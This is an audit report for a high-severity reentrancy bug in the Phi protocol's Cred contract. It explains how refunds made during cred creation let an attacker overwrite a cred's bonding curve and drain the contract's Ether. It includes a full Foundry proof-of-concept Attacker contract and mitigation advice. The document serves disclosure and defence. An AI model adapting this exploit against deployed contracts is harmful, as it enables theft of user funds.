---
tags:
  - lang/solidity
  - sector/dex
  - sector/launchpad
  - sector/lending
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/reentrancy/single-function
  - fix/use-reentrancy-guard
  - novelty/known-pattern
  - misassumption/external-call-is-safe
  - trigger/reentrancy-callback
protocol: "[[Phi]]"
auditors:
  - "[[rscodes]]"
report: "https://code4rena.com/reports/2024-08-phi"
genome:
  - "[[single-function]]"
  - "[[use-reentrancy-guard]]"
  - "[[known-pattern]]"
  - "[[direct-drain]]"
  - "[[flashloan-callback-auth]]"
  - "[[reentrancy-guard]]"
  - "[[timestamp-dependence]]"
---
# [H-06] Reentrancy in creating Creds allows an attacker to steal all Ether from the Cred contract

- id: 43397
- impact: HIGH
- protocol: [[Phi]]
- reporter: rscodes (Code4rena)
- source: https://code4rena.com/reports/2024-08-phi

## Summary


This bug report discusses a vulnerability in the cred creation and share trading functions of the protocol. This vulnerability allows an attacker to overwrite cred data and drain almost all of the contract's balance if there is more than one whitelisted bonding curve. The attacker can exploit this vulnerability by creating a cheap cred using one bonding curve, buying shares, and then using the excess Ether to create a more expensive cred with a different bonding curve. This overwrites the original cred and allows the attacker to sell shares for a profit, potentially depleting the entire contract balance. A proof of concept is provided and the report recommends implementing reentrancy guards and adhering to the Checks-Effects-Interactions Pattern to prevent this type of vulnerability in the future. After further discussion, this submission was selected for the public report due to its severe impact and the possibility of multiple price curves being selectable in the future. 

## Details


***Note: the [submission](https://github.com/code-423n4/2024-08-phi-findings/issues/25) from warden 0xCiphky was originally featured as `H-06` in this report; however, after further discussion between the judge and sponsor, it was determined that a different submission demonstrates the largest impact of the common issue. Per direction from the judge, this audit report was updated on October 16, 2024 to highlight the submission below from warden CAUsr.***

### Vulnerability Details

During cred creation, the sender automatically buys 1 share of the cred. During share purchases, a refund is issued if Ether provided by the sender exceeds the value needed. It allows an attacker to reenter both cred creation and share trading functions. Which, in turn, allows the attacker to overwrite cred data before the `credIdCounter` is incremented. This fact introduces a critical vulnerability in the case when there is more than one whitelisted bonding curve. The attacker can purchase shares cheaply, overwrite the cred, and sell the shares expensively, almost depleting the entire contract balance.

Let's discuss a possible attack vector in detail.

Preparations. The attacker prepares two sets of cred creation data which may be quite legit. The most important aspect is that the first set uses a "cheaper" bonding curve and the other uses a more expensive one (see the Impact section for more details). The sender's address would be a helper contract address. However, the attacker doesn't need to deploy the contract beforehand to know its address, since there are several ways to know a to-be-deployed contract address without exposing its bytecode (e.g. by deployer address and nonce or with the help of the `CREATE2` opcode). To sum up, at the moment of checking cred creation data and signing there are no signs of malignancy.

Then, the attacker deploys the helper contract and invokes an attack. Further actions are executed by the contract in a single transaction as follows.

1. The attacker creates the first cred, with the cheap `IBondingCurve` used. The cred creation code invokes `buyShareCred(credIdCounter, 1, 0);` as part of its job. The attacker provides excess Ether, so a refund is triggered and the control goes back to the attacker. Note that [the counter increment](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L574) is not reached yet.

    ```solidity
        function _createCredInternal(
            address creator_,
            string memory credURL_,
            string memory credType_,
            string memory verificationType_,
            address bondingCurve_,
            uint16 buyShareRoyalty_,
            uint16 sellShareRoyalty_
        )
            internal
            whenNotPaused
            returns (uint256)
        {
            if (creator_ == address(0)) {
                revert InvalidAddressZero();
            }
    
            creds[credIdCounter].creator = creator_;
            creds[credIdCounter].credURL = credURL_;
            creds[credIdCounter].credType = credType_;
            creds[credIdCounter].verificationType = verificationType_;
            creds[credIdCounter].bondingCurve = bondingCurve_;
            creds[credIdCounter].createdAt = uint40(block.timestamp);
            creds[credIdCounter].buyShareRoyalty = buyShareRoyalty_;
            creds[credIdCounter].sellShareRoyalty = sellShareRoyalty_;
    
            buyShareCred(credIdCounter, 1, 0);
    
            emit CredCreated(creator_, credIdCounter, credURL_, credType_, verificationType_);
    
            credIdCounter += 1;
    
            return credIdCounter - 1;
        }
    ```

2. The attacker buys some amount of shares of the almost created cred by invoking [buyShareCred](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L178). Note that there are no significant obstacles to doing that as the attacker can employ a flash loan. Again, the attacker provides excess Ether, so a refund is triggered and the control goes back to the attacker.
 
3. Remember that the control is still nested in `buyShareCred` nested in the first `createCred`. This time the attacker invokes the [createCred](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L232-L241) again, with the second cred creation data, with a more expensive bonding curve used. Note that there are no reentrancy guards in `createCred`, `buyShareCred`, or `sellShareCred`. The data is passed to [_createCredInternal](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L557-L570) where it overwrites the first cred contents in the `creds[credIdCounter]` (remember, the counter is not incremented yet by the first `createCred`). [Here is](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L565) the most important part of the overwriting for the attacker: they just changed the bonding curve.

    ```solidity
        creds[credIdCounter].bondingCurve = bondingCurve_;
    ```

A couple of lines below `buyShareCred` will be hit again and the attacker grabs back the control in the usual manner.

4. Now the attacker calls `sellShareCred` and dumps as many purchased shares as possible until depleting the Cred balance or his own share balance. The "more expensive" bonding curve gives the attacker more Ether than they spend while buying on step 2. Note that the share lock time also won't help as the timestamp [is not yet set](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L644), which is the subject of another finding.

    ```solidity
        if (isBuy) {
            cred.currentSupply += amount_;
            uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
            if (excessPayment > 0) {
                _msgSender().safeTransferETH(excessPayment);
            }
            lastTradeTimestamp[credId_][curator_] = block.timestamp;
        } else {
            cred.currentSupply -= amount_;
            curator_.safeTransferETH(price - protocolFee - creatorFee);
        }
    ```
   
Even if the `SHARE_LOCK_PERIOD` was honored, that would mean that the attacker has to wait 10 minutes before pocketing the profit. That would make the situation a bit more difficult for the attacker, but still highly dangerous for the protocol.

5. At this moment almost all Ether from the Cred contract is transferred to the attacker's contract. The attacker has to keep some of the Ether intact since now the unwinding of the nested calls is happening (and some fees are paid): the second `createCred`, `buyShareCred`, and the first `createCred`.

### Impact

As soon as there is more than one bonding curve whitelisted in the protocol, the vulnerability allows to drain almost entire protocol funds. Whitelisting more than one curve [seems to be an expected behavior](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L159-L166).

Fine-tuning the numbers to exploit the bonding curve price differences is a mere technicality, e.g. if there was just a 10% price difference that would be more than enough to perform an attack. Also note that on the current codebase, the attack may be repeated numerously and instantly.

### Proof of Concept

Please apply the patch to the `test/Cred.t.sol` and run with `forge test --match-test testCredDraining -vv`.

<details>

```diff
diff --git a/test/Cred.t.sol.orig b/test/Cred.t.sol
index da9157c..12b60e7 100644
--- a/test/Cred.t.sol.orig
+++ b/test/Cred.t.sol
@@ -9,7 +9,9 @@ import { LibClone } from "solady/utils/LibClone.sol";
 import { Settings } from "./helpers/Settings.sol";
 import { Cred } from "../src/Cred.sol";
 import { ICred } from "../src/interfaces/ICred.sol";
+import { IBondingCurve } from "../src/interfaces/IBondingCurve.sol";
 import { BondingCurve } from "../src/curve/BondingCurve.sol";
+import { FixedPriceBondingCurve } from "../src/lib/FixedPriceBondingCurve.sol";
 
 contract TestCred is Settings {
     uint256 private constant GRACE_PERIOD = 14 days;
@@ -243,4 +245,158 @@ contract TestCred is Settings {
         // Final assertions
         assertEq(cred.credInfo(credId).currentSupply, 1); // Only initial purchase remains
     }
+
+    // test helper function
+    function _makeCreateData(address curve, address sender) private view returns (bytes memory data, bytes memory signature) {
+        bytes memory signCreateData = abi.encode(
+            block.timestamp + 100, sender, 0, curve, "test", "BASIC", "SIGNATURE", 0x0
+        );
+        bytes32 createMsgHash = keccak256(signCreateData);
+        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
+        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
+        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
+
+        return (signCreateData, abi.encodePacked(cr, cs));
+    }
+
+    // forge test --match-test testCredDraining -vv
+    function testCredDraining() public {
+        // Constructing playground
+        _createCred("BASIC", "SIGNATURE", 0x0);
+        vm.startPrank(owner);
+        FixedPriceBondingCurve cheapCurve = new FixedPriceBondingCurve(owner);
+        cheapCurve.setCredContract(address(cred));
+        cred.addToWhitelist(address(cheapCurve));
+        vm.stopPrank();
+
+        vm.deal(address(cred), 50 ether);
+        uint credInitialBalance = address(cred).balance;
+        // Playground constructed: some creds and some ether received from share buyers
+
+        vm.deal(anyone, 2 ether);
+        uint attackerInitialBalance = address(anyone).balance;
+        vm.startPrank(anyone);
+        Attacker a = new Attacker(ICredExt(address(cred)));
+        // Step 0:
+        // Attack starts with just a couple of creds about to be created.
+        (bytes memory cheapData, bytes memory cheapSignature) = _makeCreateData(address(cheapCurve), address(a));
+        (bytes memory expensiveData, bytes memory expensiveSignature) = _makeCreateData(address(bondingCurve), address(a));
+
+        // See the contract Attacker for further details
+        a.attack{ value: 2 ether }(cheapData, cheapSignature, expensiveData, expensiveSignature);
+
+        uint credLosses = credInitialBalance - address(cred).balance;
+        uint attackerGains = address(anyone).balance - attackerInitialBalance;
+
+        console2.log("Cred lost: ", credLosses * 100 / credInitialBalance, "% of its balance");
+        assert(credLosses > 45 ether);
+        console2.log("Attacker gained: ", attackerGains / attackerInitialBalance, "times his initial balance");
+        assert(attackerGains > 40 ether);
+    }
+}
+
+
+interface ICredExt is ICred {
+    function createCred(
+        address creator_,
+        bytes calldata signedData_,
+        bytes calldata signature_,
+        uint16 buyShareRoyalty_,
+        uint16 sellShareRoyalty_
+    ) external payable;
+
+    function credIdCounter() external returns (uint256);
 }
+
+contract Attacker
+{
+    uint256 private constant sharesBuffer = 900;
+
+    ICredExt private immutable cred;
+    address private immutable owner;
+
+    bytes private cheapData;
+    bytes private cheapSignature;
+    bytes private expensiveData;
+    bytes private expensiveSignature;
+
+    uint256 private stage = 0;
+    uint256 private credId;
+
+    constructor(ICredExt cred_) {
+        cred = cred_;
+        owner = msg.sender;
+    }
+
+    function _createCred(bytes storage data, bytes storage signature) private {
+        cred.createCred{ value: 1.5 ether }(address(this), data, signature, 0, 0);
+    }
+
+    function attack(bytes calldata cheapData_, bytes calldata cheapSignature_,
+                    bytes calldata expensiveData_, bytes calldata expensiveSignature_) external payable {
+        require(msg.sender == owner);
+
+        // All the action is packed inside this call and several receive() callbacks.
+        cheapData = cheapData_;
+        cheapSignature = cheapSignature_;
+        expensiveData = expensiveData_;
+        expensiveSignature = expensiveSignature_;
+
+        stage = 1;
+        credId = cred.credIdCounter();  // This credId will be eventually overwritten in the Cred.
+
+        // Step 1: creating the first cred, with a cheap IBondingCurve used.
+        _createCred(cheapData, cheapSignature);
+
+        stage = 0;  // End of attack, at this moment the money is gone.
+    }
+
+    receive() external payable {
+        require(msg.sender == address(cred));
+
+        if (stage == 1) {
+            stage = 2;
+            // Step 2: we got there with excess payment refund triggered deep inside createCred.
+            // Now we buy more shares cheaply and hit receive() again with another refund.
+            cred.buyShareCred{ value: 0.1 ether }(credId, sharesBuffer, 0);
+        }
+        else if (stage == 2) {
+            stage = 3;
+            // Step 3: not is a tricky part: we create a new cred, but credIdCounter is not updated yet!
+            // Essentially, we overwrite the cred created at the step 1, setting an expensive IBondingCurve,
+            // and triggering another refund.
+            _createCred(expensiveData, expensiveSignature);
+        }
+        else if (stage == 3) {
+            stage = 4;
+            assert(credId == cred.credIdCounter()); // yep, we're still here
+
+            // Step 4: time to sell. Just an example of estimation of withdrawable value.
+            uint256 sellAmount = 0;
+            // We need to keep some fee on the cred's balance to allow nested call unwinds.
+            uint256 initialProtocolFee = 0.1 ether;
+            IBondingCurve curve = IBondingCurve(cred.credInfo(credId).bondingCurve);
+            while (sellAmount < sharesBuffer + 2) {
+                (uint256 price, uint256 protocolFee, uint256 creatorFee) =
+                        curve.getPriceData(credId, sharesBuffer + 2, sellAmount + 1, false);
+                if (price + protocolFee + creatorFee + initialProtocolFee > address(cred).balance)
+                    break;
+                else
+                    sellAmount++;
+            }
+
+            cred.sellShareCred(credId, sellAmount, 0);
+        }
+        else if (stage == 4) {
+            // The final step receives the sale profit and also allows nested calls to unwind the stack.
+            withdraw();    // Receiving and sending to the attacker.
+        }
+        else
+            revert("bad stage");
+    }
+
+    function withdraw() public {
+        payable(owner).transfer(address(this).balance);
+    }
+}
+
```

</details>

### Tools Used

Manual Review, Foundry

### Recommended Mitigation Steps

To mitigate this attack vector it would be enough to add a reentrancy guard [here](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L241):

```solidity
    function createCred(
        address creator_,
        bytes calldata signedData_,
        bytes calldata signature_,
        uint16 buyShareRoyalty_,
        uint16 sellShareRoyalty_
    )
        public
        payable
        whenNotPaused
+       nonReentrant
    {
```

* However, I recommend protecting with reentrancy guards all protocol functions directly or indirectly dealing with assets or important state.
* Another important measure to consider is adhering to the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern).

**[ZaK3939 (Phi) confirmed via issue \#25](https://github.com/code-423n4/2024-08-phi-findings/issues/25#event-14169412928)**

**[0xDjango (judge) commented](https://github.com/code-423n4/2024-08-phi-findings/issues/195#issuecomment-2414861921):**
> After further discussion, this submission should be selected for the public report. It shares the same root cause and fix as [#25](https://github.com/code-423n4/2024-08-phi-findings/issues/25), though highlights a much more severe impact. Sponsor indicated that there is a possibility that multiple price curves may be selectable in the future.

***Please note: the above re-assessment took place approximately 3 weeks after judging and awarding were finalized.***

***
